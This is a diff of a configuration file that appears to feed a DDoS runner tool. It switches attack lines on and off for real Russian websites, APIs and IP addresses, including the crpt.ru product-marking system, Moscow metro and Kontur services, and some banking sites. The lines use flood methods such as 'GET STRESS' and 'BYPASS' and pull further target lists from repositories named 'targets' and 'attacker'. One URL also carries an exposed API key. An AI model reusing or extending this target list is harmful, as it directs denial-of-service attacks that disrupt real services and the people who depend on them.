@@ -14,11 +14,11 @@
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/platon/platon_l4_tcp
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/vetfr/vetrf_l7 --http-methods APACHE POST
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/vetfr/vetrf_l7 --http-methods APACHE POST
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/vetfr/vetrf_l4_tcp
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/vetfr/vetrf_l4_tcp
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/vetfr/vetrf_api --http-methods APACHE POST
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/vetfr/vetrf_api --http-methods APACHE POST
 
 #COMMENT:
 
@@ -32,9 +32,9 @@
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/test/sber_api --http-methods GET STRESS
 
-#https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://edo-gismt.crpt.ru/ https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://suz2.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ https://апи.национальный-каталог.рф/ https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey=6A9769C235F432 https://suzgrid.crpt.ru:16443/api/v2/integration/connection https://nrz.api.mdlp.crpt.ru tcp://91.230.251.101:443 --http-methods GET STRESS
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://edo-gismt.crpt.ru/ https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://suz2.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ https://апи.национальный-каталог.рф/ https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey=6A9769C235F432 https://suzgrid.crpt.ru:16443/api/v2/integration/connection https://nrz.api.mdlp.crpt.ru tcp://91.230.251.101:443 --http-methods GET STRESS
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/api_crpt --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/api_crpt --http-methods GET STRESS
 
 #http://nnoblsud.ru https://mosmetro.ru https://job.mosmetro.ru https://mis.mosmetro.ru/login.php https://app-bucket.mosmetro.ru https://shop.mosmetro.ru https://mcd.mosmetro.ru https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://focus-api.kontur.ru/ https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/ https://edi-api.kontur.ru https://evrika.kontur.ru --http-methods GET STRESS
 
@@ -90,12 +90,12 @@ https://bank-online-kabinet.ru/wp-json/ http://87.236.16.13:80 http://87.236.16.
 
 #-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/api_auto_mila --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
 
 https://www.a-3.ru/pay_gaz --http-methods GET STRESS
